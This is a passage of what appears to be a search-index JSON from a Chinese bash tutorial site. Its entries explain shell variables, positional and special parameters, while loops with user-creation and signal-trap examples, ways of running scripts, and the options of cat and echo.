$name //\u5728\u5b50shell\u4e2d\u662f\u770b\u4e0d\u5230\u7236shell\u4e2d\u7684\u672c\u5730\u53d8\u91cf [root@shell tmp]# exit exit [root@shell tmp]# echo $SHLVL 2","title":"\u672c\u5730\u53d8\u91cf  \u2014\u2014  \u5c40\u90e8\u53d8\u91cf"},{"location":"programming_language/bash/var/#_3","text":"\u4f5c\u7528\u8303\u56f4\uff1a\u5f53\u524dshell\u53ca\u5176\u5b50shell \u5b9a\u4e49\u73af\u5883\u53d8\u91cf\uff1a 1\uff09\u5c06\u5df2\u7ecf\u5b9a\u4e49\u7684\u672c\u5730\u53d8\u91cf\u5bfc\u51fa\u6210\u73af\u5883\u53d8\u91cf export [root@shell tmp]# export name [root@shell tmp]# echo $name mary [root@shell tmp]# bash [root@shell tmp]# echo $name //\u5728\u5b50shell\u4e2d\u53ef\u4ee5\u770b\u5230name\u7684\u503c\u4e86 mary 2\uff09\u5728\u5b9a\u4e49\u53d8\u91cf\u65f6\uff0c\u76f4\u63a5\u5c06\u5176\u5b9a\u4e49\u4e3a\u73af\u5883\u53d8\u91cf [root@shell tmp]# echo $SHLVL 2 [root@shell tmp]# export age=88 [root@shell tmp]# bash [root@shell tmp]# echo $age 88 \u6ce8\u610f\uff1a\u5728\u5b50shell\u4e2d\u4fee\u6539\u53d8\u91cf\u7684\u503c\uff0c\u4e0d\u5f71\u54cd\u7236shell\u4e2d\u7684\u53d8\u91cf\u7684\u503c\u3002 [root@shell tmp]# echo $SHLVL 3 [root@shell tmp]# age=66 [root@shell tmp]# echo $age 66 [root@shell tmp]# exit exit [root@shell tmp]# echo $age 88 \u7236\u53d8\u5b50\u4e5f\u53d8\uff0c\u5b50\u53d8\u7236\u4e0d\u53d8\u3002 \u5982\u679c\u60f3\u8ba9\u73af\u5883\u53d8\u91cf\u6c38\u4e45\u751f\u6548\uff0c\u90a3\u4e48\u5c31\u5199\u5728\u73af\u5883\u53d8\u91cf\u914d\u7f6e\u6587\u4ef6\u4e2d\u5373\u53ef\u3002 \u53d6\u6d88\u53d8\u91cf\u7684\u503c [root@shell tmp]# unset name [root@shell tmp]# echo $name","title":"\u73af\u5883\u53d8\u91cf \u2014\u2014 \u5168\u5c40\u53d8\u91cf"},{"location":"programming_language/bash/var/#_4","text":"$0 \u2014\u2014 \u8868\u793a\u5f53\u524d\u8fd0\u884c\u7684\u811a\u672c\u6216\u8005\u547d\u4ee4\u672c\u8eab $1 ~ ${10} \u2014\u2014 \u8868\u793a\u811a\u672c\u7684\u4f4d\u7f6e\u53c2\u6570\uff0c$1\u8868\u793a\u7b2c\u4e00\u4e2a\u53c2\u6570\uff0c\u4f9d\u6b64\u7c7b\u63a8 $# \u2014\u2014 \u8868\u793a\u53c2\u6570\u7684\u4e2a\u6570 $ \u8fd9\u4e2a\u53d8\u91cf\u4ee3\u8868\u547d\u4ee4\u884c\u4e2d\u6240\u6709\u7684\u53c2\u6570\uff0c $ \u628a\u6240\u6709\u7684\u53c2\u6570\u770b\u6210\u4e00\u4e2a\u6574\u4f53 $@ \u8fd9\u4e2a\u53d8\u91cf\u4e5f\u4ee3\u8868\u547d\u4ee4\u884c\u4e2d\u6240\u6709\u7684\u53c2\u6570\uff0c \u4e0d\u8fc7$@\u628a\u6bcf\u4e2a\u53c2\u6570\u533a\u5206\u5bf9\u5f85 $@\u548c$* \u2014\u2014 \u8868\u793a\u53c2\u6570\u7684\u5217\u8868 [root@shell tmp]# ls /root /tmp ls \u2014\u2014 $0 /root \u2014\u2014 $1 /tmp \u2014\u2014 $2 [root@shell tmp]# cd /script/ [root@shell script]# cat position.sh #!/bin/bash echo '$0='$0 echo '$1='$1 echo '$2='$2 echo '$3='$3 echo '$4='$4 echo '$5='$5 echo '$6='$6 echo '$7='$7 echo '$8='$8 echo '$9='$9 echo '$10='$10 echo '$11='${11} echo '$#='$# echo '$*='$* echo '$@='$@ [root@shell script]# chmod +x position.sh [root@shell script]# ./position.sh a b c d e f g h i j k l m $0=./position.sh $1=a $2=b $3=c $4=d $5=e $6=f $7=g $8=h $9=i $10=a0 $11=k $#=13 // \u53c2\u6570\u7684\u4e2a\u6570 $*=a b c d e f g h i j k l m //\u6253\u5370\u53c2\u6570\u5217\u8868 $@=a b c d e f g h i j k l m $*\u548c$@\u662fShell\u7684\u7279\u6b8a\u53d8\u91cf\uff0c\u4f5c\u7528\u90fd\u662f\u83b7\u53d6\u4f20\u9012\u7ed9\u811a\u672c\u6216\u51fd\u6570\u7684\u6240\u6709\u53c2\u6570\u3002\u5728\u6ca1\u6709\u88ab\u53cc\u5f15\u53f7\u5305\u56f4\u65f6\uff0c\u4e24\u8005\u6ca1\u6709\u533a\u522b\uff0c\u90fd\u662f\u5c06\u63a5\u53d7\u5230\u7684\u6bcf\u4e2a\u53c2\u6570\u90fd\u662f\u72ec\u7acb\u7684\uff0c\u7528\u7a7a\u683c\u5206\u9694\u3002\u4e5f\u5c31\u662f\u8bf4\u4e0b\u9762\u4e24\u6bb5\u4ee3\u7801\u662f\u7b49\u6548\u7684\u3002 [root@localhost code]# cat test for var in $@ do echo ${var} done [root@localhost code]# [root@localhost code]# ./test a b c d e a b c d e [root@localhost code]# [root@localhost code]# chmod a+x test1 [root@localhost code]# cat test1 for var in $* do echo ${var} done [root@localhost code]# ./test1 a b c d a b c d \u5f53\u88ab\u53cc\u5f15\u53f7\u5305\u56f4\u65f6\uff0c$@\u4e0e\u6ca1\u6709\u88ab\u53cc\u5f15\u53f7\u5305\u56f4\u65f6\u6ca1\u6709\u53d8\u5316\uff0c\u6bcf\u4e2a\u53c2\u6570\u4f9d\u7136\u662f\u72ec\u7acb\u7684\u3002\u4f46\u662f$*\u88ab\u53cc\u5f15\u53f7\u5305\u56f4\u65f6\uff0c\u4f1a\u5c06\u6240\u6709\u53c2\u6570\u770b\u4f5c\u4e00\u4e2a\u6574\u4f53\u3002\u4e0b\u9762\u4e24\u6bb5\u4ee3\u7801\u7684\u7ed3\u679c\u662f\u4e0d\u540c\u7684\u3002 [root@localhost code]# cat test for var in \"$@\" do echo ${var} done [root@localhost code]# ./test a b c d a b c d [root@localhost code]# [root@localhost code]# cat test1 for var in \"$*\" do echo ${var} done [root@localhost code]# [root@localhost code]# ./test1 a b c d a b c d [root@localhost code]#","title":"\u4f4d\u7f6e\u53d8\u91cf"},{"location":"programming_language/bash/var/#_5","text":"$$ \u2014\u2014 \u67e5\u770b\u5f53\u524dshell\u7684pid [root@shell script]# echo $$ 8015 !$\u548c$_ \u2014\u2014 \u4e0a\u4e00\u6761\u547d\u4ee4\u7684\u6700\u540e\u4e00\u4e2a\u53c2\u6570 [root@shell yum.repos.d]# cd /etc/yum.repos.d/ [root@shell yum.repos.d]# cat local.repo [root@shell yum.repos.d]# cat !$ \u6216\u8005 alt+.(\u70b9) \u4e5f\u53ef\u4ee5 $?\uff1a\u4e0a\u4e00\u6761\u547d\u4ee4\u7684\u6267\u884c\u72b6\u6001\u7684\u8fd4\u56de\u503c \u2014\u2014 \u5199\u811a\u672c\u65f6\u6709\u7528 \u6267\u884c\u72b6\u6001\u8fd4\u56de\u503c(0-255)\uff0c\u5206\u4e24\u7c7b 0\uff1a\u8868\u793a\u4e0a\u4e00\u6761\u547d\u4ee4\u6267\u884c\u6210\u529f \u975e0\uff1a\u8868\u793a\u4e0a\u4e00\u6761\u547d\u4ee4\u6267\u884c\u5931\u8d25 [root@shell ~]# ls /tmp/douniwan &>/dev/null [root@shell ~]# echo $? 0 [root@shell ~]# ls /tmp/nidoushui &>/dev/null [root@shell ~]# echo $? 2","title":"\u7279\u6b8a\u53d8\u91cf"},{"location":"programming_language/bash/var/#_6","text":"1\u3001$\u53d8\u91cf\u540d echo $\u53d8\u91cf\u540d 2\u3001${\u53d8\u91cf\u540d} \u2014\u2014 \u4e3a\u4e86\u9632\u6b62\u6b67\u4e49 [root@shell ~]# fruit=banana [root@shell ~]# echo \"There are some $fruits.\" There are some . [root@shell ~]# echo \"There are some ${fruit}s.\" There are some bananas.","title":"\u53d8\u91cf\u7684\u5f15\u7528"},{"location":"programming_language/bash/var/#local","text":"\u4f5c\u7528\uff1a\u4e00\u822c\u7528\u4e8eshell\u5185\u5c40\u90e8\u53d8\u91cf\u7684\u5b9a\u4e49\uff0c\u591a\u4f7f\u7528\u5728\u51fd\u6570\u5185\u90e8 \uff081\uff09shell\u811a\u672c\u4e2d\u5b9a\u4e49\u7684\u53d8\u91cf\u662fglobal\u7684\uff0c\u5176\u4f5c\u7528\u57df\u4ece\u88ab\u5b9a\u4e49\u7684\u5730\u65b9\u5f00\u59cb\uff0c\u5230shell\u7ed3\u675f\u6216\u88ab\u663e\u793a\u5220\u9664\u7684\u5730\u65b9\u4e3a\u6b62\u3002 \uff082\uff09shell\u51fd\u6570\u5b9a\u4e49\u7684\u53d8\u91cf\u9ed8\u8ba4\u662fglobal\u7684\uff0c\u5176\u4f5c\u7528\u57df\u4ece \u51fd\u6570\u88ab\u8c03\u7528\u65f6\u6267\u884c\u53d8\u91cf\u5b9a\u4e49\u7684\u5730\u65b9 \u5f00\u59cb\uff0c\u5230shell\u7ed3\u675f\u6216\u88ab\u663e\u793a\u5220\u9664\u5904\u4e3a\u6b62\u3002\u51fd\u6570\u5b9a\u4e49\u7684\u53d8\u91cf\u53ef\u4ee5\u88ab\u663e\u793a\u5b9a\u4e49\u6210local\u7684\uff0c\u5176\u4f5c\u7528\u57df\u5c40\u9650\u4e8e\u51fd\u6570\u5185\u3002\u4f46\u8bf7\u6ce8\u610f\uff0c\u51fd\u6570\u7684\u53c2\u6570\u662flocal\u7684\u3002 \uff083\uff09\u5982\u679c\u540c\u540d\uff0cShell\u51fd\u6570\u5b9a\u4e49\u7684local\u53d8\u91cf\u4f1a\u5c4f\u853d\u811a\u672c\u5b9a\u4e49\u7684global\u53d8\u91cf\u3002 #!/bin/bash function Hello() { local text=\"Hello World!!!\" #\u5c40\u90e8\u53d8\u91cf echo $text } Hello","title":"local\u5173\u952e\u5b57"},{"location":"programming_language/bash/while/","text":"while while\u8bed\u6cd5\uff1a \u53d8\u91cf\u521d\u59cb\u503c while \u6761\u4ef6\u8868\u8fbe\u5f0f\u6216\u8005\u547d\u4ee4(read) do \u5faa\u73af\u4f53 \u53d8\u91cf\u7684\u66f4\u65b0 //\u4e00\u5b9a\u8981\u6709\u53d8\u91cf\u7684\u66f4\u65b0\uff0c\u5426\u5219\u6b7b\u5faa\u73af done \u8bf4\u660e\uff1awhile\u5faa\u73af\uff0c\u5f53\u5224\u65ad\u6761\u4ef6\u4e3a\u771f\u65f6\uff0c\u6267\u884c\u5faa\u73af\u4f53\u4e2d\u7684\u64cd\u4f5c\uff1b\u5f53\u5224\u65ad\u6761\u4ef6\u4e3a\u5047\u65f6\u9000\u51fa\u5faa\u73af\u3002 [root@shell script]# while1.sh #!/bin/bash i=1 while [ $i -le 5 ] do echo $i let i++ done [root@shell script]# sh while1.sh 1 2 3 4 5 #i++\uff1a\u5148\u4f7f\u7528\uff0c\u518d\u52a01 #++i\uff1a\u5148\u52a01\uff0c\u518d\u4f7f\u7528 #let i++ #let ++i #i-- #--i while\u4e0e\u8f93\u5165\u91cd\u5b9a\u5411\u7ed3\u5408\u4f7f\u7528 \u6dfb\u52a0\u7528\u6237\u7684\u811a\u672c\uff0c\u8981\u6c42\u7528\u6237\u7684\u4fe1\u606f\u6765\u81ea\u4e8e\u6587\u672c\u6587\u4ef6 1\uff09\u521b\u5efa\u7528\u6237\u5217\u8868\u6587\u4ef6 [root@shell script]# cat userlist tom:passtom:2015 jack:passjack:2016 mary:passmary:2022 kite:passkite:2000 2\uff09\u5199\u6dfb\u52a0\u7528\u6237\u7684\u811a\u672c [root@shell script]# cat while2.sh #!/bin/bash while read line do username=`echo $line | cut -d: -f1` password=`echo $line | cut -d: -f2` uid=`echo $line | cut -d: -f3` if id $username &>/dev/null then echo \"user $username exists.\" else useradd -u $uid $username && echo $password | passwd --stdin $username fi done < /script/userlist [root@shell script]# sh while2.sh Changing password for user tom. passwd: all authentication tokens updated successfully. Changing password for user jack. passwd: all authentication tokens updated successfully. Changing password for user mary. passwd: all authentication tokens updated successfully. Changing password for user kite. passwd: all authentication tokens updated successfully. while \u6b7b\u5faa\u73af while : while true \u6355\u6349\u4fe1\u53f7 trap \u52a8\u4f5c \u4fe1\u53f7 [root@shell script]# while3.sh #!/bin/bash trap \"echo You can not kill me.\" 15 while : do echo hello sleep 2 done \u6807\u7b7e\u4e00 [root@shell script]# sh while3.sh hello hello hello hello \u6807\u7b7e\u4e8c [root@shell script]# ps -ef | grep while root 22305 15580 0 14:50 pts/3 00:00:00 sh while3.sh root 22334 18500 0 14:51 pts/4 00:00:00 grep while [root@shell script]# kill -15 22305 //\u65e0\u6cd5\u6740\u6b7b\u8fdb\u7a0b \u6807\u7b7e\u4e00 hello hello You can not kill me. hello [root@shell 20160902]# while_useradd.sh #!/bin/bash while : do read -p \"user: \" username if [ $username = \"q\" ] then exit fi if id $username &>/dev/null then echo \"exists\" else useradd $username && echo \"user $username added\" fi done \u200b #!/bin/bash #99\u4e58\u6cd5\u8868 i=1 while [ $i -le 9 ] do j=1 while [ $j -le $i ] do echo -n \"${i}x${j}=\"$[${i}*${j}]\" \" j=$[$j+1] done echo let i++ done","title":"while\u5faa\u73af"},{"location":"programming_language/bash/while/#while","text":"while\u8bed\u6cd5\uff1a \u53d8\u91cf\u521d\u59cb\u503c while \u6761\u4ef6\u8868\u8fbe\u5f0f\u6216\u8005\u547d\u4ee4(read) do \u5faa\u73af\u4f53 \u53d8\u91cf\u7684\u66f4\u65b0 //\u4e00\u5b9a\u8981\u6709\u53d8\u91cf\u7684\u66f4\u65b0\uff0c\u5426\u5219\u6b7b\u5faa\u73af done \u8bf4\u660e\uff1awhile\u5faa\u73af\uff0c\u5f53\u5224\u65ad\u6761\u4ef6\u4e3a\u771f\u65f6\uff0c\u6267\u884c\u5faa\u73af\u4f53\u4e2d\u7684\u64cd\u4f5c\uff1b\u5f53\u5224\u65ad\u6761\u4ef6\u4e3a\u5047\u65f6\u9000\u51fa\u5faa\u73af\u3002 [root@shell script]# while1.sh #!/bin/bash i=1 while [ $i -le 5 ] do echo $i let i++ done [root@shell script]# sh while1.sh 1 2 3 4 5 #i++\uff1a\u5148\u4f7f\u7528\uff0c\u518d\u52a01 #++i\uff1a\u5148\u52a01\uff0c\u518d\u4f7f\u7528 #let i++ #let ++i #i-- #--i","title":"while"},{"location":"programming_language/bash/while/#while_1","text":"\u6dfb\u52a0\u7528\u6237\u7684\u811a\u672c\uff0c\u8981\u6c42\u7528\u6237\u7684\u4fe1\u606f\u6765\u81ea\u4e8e\u6587\u672c\u6587\u4ef6 1\uff09\u521b\u5efa\u7528\u6237\u5217\u8868\u6587\u4ef6 [root@shell script]# cat userlist tom:passtom:2015 jack:passjack:2016 mary:passmary:2022 kite:passkite:2000 2\uff09\u5199\u6dfb\u52a0\u7528\u6237\u7684\u811a\u672c [root@shell script]# cat while2.sh #!/bin/bash while read line do username=`echo $line | cut -d: -f1` password=`echo $line | cut -d: -f2` uid=`echo $line | cut -d: -f3` if id $username &>/dev/null then echo \"user $username exists.\" else useradd -u $uid $username && echo $password | passwd --stdin $username fi done < /script/userlist [root@shell script]# sh while2.sh Changing password for user tom. passwd: all authentication tokens updated successfully. Changing password for user jack. passwd: all authentication tokens updated successfully. Changing password for user mary. passwd: all authentication tokens updated successfully. Changing password for user kite. passwd: all authentication tokens updated successfully.","title":"while\u4e0e\u8f93\u5165\u91cd\u5b9a\u5411\u7ed3\u5408\u4f7f\u7528"},{"location":"programming_language/bash/while/#while_2","text":"while : while true \u6355\u6349\u4fe1\u53f7 trap \u52a8\u4f5c \u4fe1\u53f7 [root@shell script]# while3.sh #!/bin/bash trap \"echo You can not kill me.\" 15 while : do echo hello sleep 2 done \u6807\u7b7e\u4e00 [root@shell script]# sh while3.sh hello hello hello hello \u6807\u7b7e\u4e8c [root@shell script]# ps -ef | grep while root 22305 15580 0 14:50 pts/3 00:00:00 sh while3.sh root 22334 18500 0 14:51 pts/4 00:00:00 grep while [root@shell script]# kill -15 22305 //\u65e0\u6cd5\u6740\u6b7b\u8fdb\u7a0b \u6807\u7b7e\u4e00 hello hello You can not kill me. hello [root@shell 20160902]# while_useradd.sh #!/bin/bash while : do read -p \"user: \" username if [ $username = \"q\" ] then exit fi if id $username &>/dev/null then echo \"exists\" else useradd $username && echo \"user $username added\" fi done \u200b #!/bin/bash #99\u4e58\u6cd5\u8868 i=1 while [ $i -le 9 ] do j=1 while [ $j -le $i ] do echo -n \"${i}x${j}=\"$[${i}*${j}]\" \" j=$[$j+1] done echo let i++ done","title":"while \u6b7b\u5faa\u73af"},{"location":"programming_language/bash/%E4%B8%8D%E5%90%8C%E7%9A%84%E8%84%9A%E6%9C%AC%E6%89%A7%E8%A1%8C%E6%96%B9%E5%BC%8F/","text":"\u5728 Unix \u548c\u7c7b Unix \u7cfb\u7edf\u4e2d\uff0c\u6267\u884c\u811a\u672c\u7684\u65b9\u5f0f\u4e3b\u8981\u6709\u4ee5\u4e0b\u51e0\u79cd\uff0c\u6bcf\u79cd\u65b9\u5f0f\u90fd\u6709\u5176\u7279\u5b9a\u7684\u7528\u9014\u548c\u884c\u4e3a\u5dee\u5f02\uff1a 1.\u4f7f\u7528 bash \u811a\u672c \u547d\u4ee4 : - \u8fd9\u79cd\u65b9\u5f0f\u662f\u901a\u8fc7\u76f4\u63a5\u8c03\u7528 bash \u7a0b\u5e8f\u6765\u6267\u884c\u811a\u672c\u3002 - \u8fd9\u610f\u5473\u7740\u811a\u672c\u5c06\u5728 Bash shell \u73af\u5883\u4e2d\u8fd0\u884c\uff0c\u65e0\u8bba\u811a\u672c\u7684\u9996\u884c\uff08shebang\uff0c\u5982 #!/bin/sh \uff09\u6307\u5b9a\u7684\u662f\u4ec0\u4e48 shell\u3002 - \u8fd9\u662f\u5728\u786e\u4fe1\u811a\u672c\u9700\u8981 Bash \u529f\u80fd\u65f6\u4f7f\u7528\u7684\u65b9\u6cd5\u3002 2.\u4f7f\u7528 sh \u811a\u672c \u547d\u4ee4 : - \u4f7f\u7528 sh \u547d\u4ee4\u6267\u884c\u811a\u672c\u4f1a\u5728 sh \uff08Bourne shell\uff09\u73af\u5883\u4e2d\u8fd0\u884c\u8be5\u811a\u672c\u3002 - sh \u901a\u5e38\u662f\u7cfb\u7edf\u7684\u9ed8\u8ba4 shell\uff0c\u53ef\u80fd\u662f Bash\u3001Dash \u7b49 shell \u7684\u4e00\u4e2a\u94fe\u63a5\u6216\u517c\u5bb9\u6a21\u5f0f\u3002 - \u5982\u679c\u811a\u672c\u662f\u4e3a Bourne shell\uff08\u6216\u517c\u5bb9 shell\uff09\u7f16\u5199\u7684\uff0c\u4f7f\u7528 sh \u6267\u884c\u5b83\u66f4\u5408\u9002\u3002 3.\u4f7f\u7528 ./\u811a\u672c \u547d\u4ee4 : - \u4f7f\u7528 ./\u811a\u672c \u547d\u4ee4\u6267\u884c\u811a\u672c\u65f6\uff0c\u5fc5\u987b\u4e3a\u811a\u672c\u6587\u4ef6\u8bbe\u7f6e\u6267\u884c\u6743\u9650\uff08\u4f8b\u5982\uff0c\u4f7f\u7528 chmod +x \u811a\u672c \u547d\u4ee4\uff09\u3002 - \u8fd9\u79cd\u65b9\u5f0f\u5c06\u6839\u636e\u811a\u672c\u9996\u884c\u7684 shebang \u884c\uff08\u5982 #!/bin/bash \uff09\u6765\u786e\u5b9a\u4f7f\u7528\u54ea\u4e2a shell \u6267\u884c\u811a\u672c\u3002 - \u8fd9\u662f\u6700\u5e38\u7528\u7684\u6267\u884c\u811a\u672c\u65b9\u5f0f\uff0c\u56e0\u4e3a\u5b83\u9075\u5faa\u811a\u672c\u4f5c\u8005\u6307\u5b9a\u7684 shell \u73af\u5883\u3002 4. \u4f7f\u7528 . \u811a\u672c \u6216 source \u811a\u672c \u547d\u4ee4 : - \u4f7f\u7528 . \uff08\u4e5f\u79f0\u4e3a\u70b9\u547d\u4ee4\uff09\u6216 source \u547d\u4ee4\u6267\u884c\u811a\u672c\u4f1a\u5728\u5f53\u524d shell \u73af\u5883\u4e2d\u8fd0\u884c\u811a\u672c\uff0c\u800c\u4e0d\u662f\u542f\u52a8\u4e00\u4e2a\u65b0\u7684 shell\u3002 - \u8fd9\u610f\u5473\u7740\u811a\u672c\u4e2d\u6240\u6709\u7684\u53d8\u91cf\u548c\u51fd\u6570\u5c06\u5728\u5f53\u524d shell \u4e2d\u6709\u6548\uff0c\u5bf9\u5f53\u524d\u73af\u5883\u6709\u76f4\u63a5\u5f71\u54cd\u3002 - \u8fd9\u79cd\u65b9\u5f0f\u5e38\u7528\u4e8e\u914d\u7f6e\u6587\u4ef6\uff08\u5982 .bashrc \u6216 .profile \uff09\uff0c\u8fd9\u4e9b\u6587\u4ef6\u8bbe\u7f6e\u73af\u5883\u53d8\u91cf\u6216\u5b9a\u4e49\u51fd\u6570\u3002 \u603b\u7ed3\u4e00\u4e0b\uff0c\u8fd9\u56db\u79cd\u65b9\u5f0f\u7684\u4e3b\u8981\u533a\u522b\u5728\u4e8e\u6267\u884c\u811a\u672c\u65f6\u6240\u4f7f\u7528\u7684 shell \u73af\u5883\u548c\u811a\u672c\u5bf9\u5f53\u524d shell \u73af\u5883\u7684\u5f71\u54cd\u7a0b\u5ea6\u3002\u9009\u62e9\u54ea\u79cd\u65b9\u5f0f\u53d6\u51b3\u4e8e\u811a\u672c\u7684\u5185\u5bb9\u548c\u4f60\u60f3\u8981\u5982\u4f55\u5f71\u54cd\u5f53\u524d\u7684 shell \u73af\u5883\u3002 source\u548c.\u4e0d\u6539\u53d8\u5f53\u524d\u8fdb\u7a0b\u53f7\uff0c./\u548csh\u6539\u53d8\u5f53\u524d\u8fdb\u7a0b\u53f7 source\u548c.\u6267\u884c\u5b8c\u811a\u672c\uff0c\u811a\u672c\u4e2d\u53d8\u91cf\u80fd\u6253\u5370\u51fa\u6765\uff0c./\u548csh\u6267\u884c\u5b8c\u811a\u672c\uff0c\u811a\u672c\u53d8\u91cf\u6253\u5370\u4e0d\u51fa\u6765","title":"\u4e0d\u540c\u7684\u811a\u672c\u6267\u884c\u65b9\u5f0f"},{"location":"programming_language/bash_help/","text":"\u4e00\u4e9b\u5e2e\u52a9\u4e66\u5199Bash\u811a\u672c\u7684\u4e1c\u897f","title":"\u4e00\u4e9b\u5e2e\u52a9\u4e66\u5199Bash\u811a\u672c\u7684\u4e1c\u897f"},{"location":"programming_language/bash_help/#bash","text":"","title":"\u4e00\u4e9b\u5e2e\u52a9\u4e66\u5199Bash\u811a\u672c\u7684\u4e1c\u897f"},{"location":"programming_language/bash_help/cat/","text":"cat \u8bed\u6cd5 \u8bed\u6cd5\u683c\u5f0f\uff1a cat [\u53c2\u6570] [\u6587\u4ef6] \u53c2\u6570\u8bf4\u660e\uff1a -n \u663e\u793a\u884c\u6570\uff08\u7a7a\u884c\u4e5f\u7f16\u53f7\uff09 -s \u663e\u793a\u884c\u6570\uff08\u591a\u4e2a\u7a7a\u884c\u7b97\u4e00\u4e2a\u7f16\u53f7\uff09 -b \u663e\u793a\u884c\u6570\uff08\u7a7a\u884c\u4e0d\u7f16\u53f7\uff09 -E \u6bcf\u884c\u7ed3\u675f\u5904\u663e\u793a$\u7b26\u53f7 -T \u5c06TAB\u5b57\u7b26\u663e\u793a\u4e3a ^I\u7b26\u53f7 -v \u4f7f\u7528 ^ \u548c M- \u5f15\u7528\uff0c\u9664\u4e86 LFD \u548c TAB \u4e4b\u5916 -e \u7b49\u4ef7\u4e8e\u201d-vE\u201d\u7ec4\u5408 -t \u7b49\u4ef7\u4e8e\u201d-vT\u201d\u7ec4\u5408 -A \u7b49\u4ef7\u4e8e -vET\u7ec4\u5408 --help \u663e\u793a\u5e2e\u52a9\u4fe1\u606f --version \u663e\u793a\u7248\u672c\u4fe1\u606f \u6700\u8fd1\u53d1\u73b0\u67d0\u4e9b\u65e5\u5fd7\u7684\u5206\u9694\u7b26\u4f7f\u7528\u7684\u662f\"\\001\"\uff0c\u8fd9\u79cd\u5c5e\u4e8e\u9690\u85cf\u5b57\u7b26\uff0c\u4f7f\u7528tail -f \u6216\u8005cat\u5e76\u4e0d\u80fd\u770b\u5230\uff0c\u7ecf\u8fc7\u6d4b\u8bd5\u53d1\u73b0\uff0c\u4f7f\u7528less\u53ef\u4ee5\uff0ccat\u7684\u8bdd,\u589e\u52a0-A\u6216-v\u53ef\u4ee5\u770b\u5230 \u663e\u793a\u6307\u5b9a\u884c \u663e\u793a\u524d1000\u884c cat [filename] | head -n 1000 \u663e\u793a\u6700\u540e1000\u884c cat [filename] | tail -n 1000 \u4ece1000\u884c\u4ee5\u540e\u5f00\u59cb\u663e\u793a cat [filename] | tail -n +1000 \u7ec4\u5408\u4f8b\u5b50 \u4ece1000\u884c\u5f00\u59cb\u663e\u793a3000\u884c cat [filename] | tail -n +1000 | head -n 3000 \u4ece3000\u884c\u5f00\u59cb\u663e\u793a1000\u884c cat [filename] | tail -n +3000 | head -n 1000 \u663e\u793a1000\u884c\u52303000\u884c cat [filename] | head -n 3000 | tail -n +1000","title":"bash\u811a\u672c\u67e5\u770b\u6587\u4ef6\u6307\u5b9a\u884c"},{"location":"programming_language/bash_help/cat/#cat","text":"","title":"cat"},{"location":"programming_language/bash_help/cat/#_1","text":"\u8bed\u6cd5\u683c\u5f0f\uff1a cat [\u53c2\u6570] [\u6587\u4ef6] \u53c2\u6570\u8bf4\u660e\uff1a -n \u663e\u793a\u884c\u6570\uff08\u7a7a\u884c\u4e5f\u7f16\u53f7\uff09 -s \u663e\u793a\u884c\u6570\uff08\u591a\u4e2a\u7a7a\u884c\u7b97\u4e00\u4e2a\u7f16\u53f7\uff09 -b \u663e\u793a\u884c\u6570\uff08\u7a7a\u884c\u4e0d\u7f16\u53f7\uff09 -E \u6bcf\u884c\u7ed3\u675f\u5904\u663e\u793a$\u7b26\u53f7 -T \u5c06TAB\u5b57\u7b26\u663e\u793a\u4e3a ^I\u7b26\u53f7 -v \u4f7f\u7528 ^ \u548c M- \u5f15\u7528\uff0c\u9664\u4e86 LFD \u548c TAB \u4e4b\u5916 -e \u7b49\u4ef7\u4e8e\u201d-vE\u201d\u7ec4\u5408 -t \u7b49\u4ef7\u4e8e\u201d-vT\u201d\u7ec4\u5408 -A \u7b49\u4ef7\u4e8e -vET\u7ec4\u5408 --help \u663e\u793a\u5e2e\u52a9\u4fe1\u606f --version \u663e\u793a\u7248\u672c\u4fe1\u606f \u6700\u8fd1\u53d1\u73b0\u67d0\u4e9b\u65e5\u5fd7\u7684\u5206\u9694\u7b26\u4f7f\u7528\u7684\u662f\"\\001\"\uff0c\u8fd9\u79cd\u5c5e\u4e8e\u9690\u85cf\u5b57\u7b26\uff0c\u4f7f\u7528tail -f \u6216\u8005cat\u5e76\u4e0d\u80fd\u770b\u5230\uff0c\u7ecf\u8fc7\u6d4b\u8bd5\u53d1\u73b0\uff0c\u4f7f\u7528less\u53ef\u4ee5\uff0ccat\u7684\u8bdd,\u589e\u52a0-A\u6216-v\u53ef\u4ee5\u770b\u5230","title":"\u8bed\u6cd5"},{"location":"programming_language/bash_help/cat/#_2","text":"\u663e\u793a\u524d1000\u884c cat [filename] | head -n 1000 \u663e\u793a\u6700\u540e1000\u884c cat [filename] | tail -n 1000 \u4ece1000\u884c\u4ee5\u540e\u5f00\u59cb\u663e\u793a cat [filename] | tail -n +1000 \u7ec4\u5408\u4f8b\u5b50 \u4ece1000\u884c\u5f00\u59cb\u663e\u793a3000\u884c cat [filename] | tail -n +1000 | head -n 3000 \u4ece3000\u884c\u5f00\u59cb\u663e\u793a1000\u884c cat [filename] | tail -n +3000 | head -n 1000 \u663e\u793a1000\u884c\u52303000\u884c cat [filename] | head -n 3000 | tail -n +1000","title":"\u663e\u793a\u6307\u5b9a\u884c"},{"location":"programming_language/bash_help/echo/","text":"echo \u8bed\u6cd5 \u200b echo [\u9009\u9879] [\u8f93\u51fa\u5185\u5bb9] \u9009\u9879\uff1a -e\uff1a \u652f\u6301\u53cd\u659c\u7ebf\u63a7\u5236\u7684\u5b57\u7b26\u8f6c\u6362 \u200b -n : \u4e0d\u6362\u884c\u8f93\u51fa \\\\ \u8f93\u51fa\\\u672c\u8eab \\a \u8f93\u51fa\u8b66\u544a\u97f3 \\007\u8f93\u51fa\u8b66\u544a\u97f3\uff0c\u8b66\u544a\u97f3\u53ef\u4ee5\u548csleep\u914d\u5408 \\b \u9000\u683c\u952e\uff0c\u4e5f\u5c31\u662f\u5411\u5de6\u5220\u9664\u952e \\c \u53d6\u6d88\u8f93\u51fa\u884c\u672b\u7684\u6362\u884c\u7b26\u3002\u548c\u201c-n\u201d\u9009\u9879\u4e00\u81f4 \\e ESCAPE\u952e \u5c31\u662fesc\u952e\u5b50 \\033 ESCAPE\u952e \\f \u6362\u9875\u7b26 \\n \u6362\u884c\u7b26 \\r \u56de\u8f66\u952e \\t \u5236\u8868\u7b26\uff0c\u4e5f\u5c31\u662fTab\u952e \\v \u5782\u76f4\u5236\u8868\u7b26 \\0nnn \u6309\u7167\u516b\u8fdb\u5236ASCII\u7801\u8868\u8f93\u51fa\u5b57\u7b26\u3002\u5176\u4e2d0\u4e3a\u6570\u5b57\u96f6\uff0cnnn\u662f\u4e09\u4f4d\u516b\u8fdb\u5236\u6570 \\xhh \u6309\u7167\u5341\u516d\u8fdb\u5236ASCII\u7801\u8868\u8f93\u51fa\u5b57\u7b26\u3002\u5176\u4e2dhh\u662f\u4e24\u4f4d\u5341\u516d\u8fdb\u5236\u6570 \\e[1; \u5f00\u542f\u989c\u8272 \\e[0m \u5173\u95ed\u989c\u8272 echo 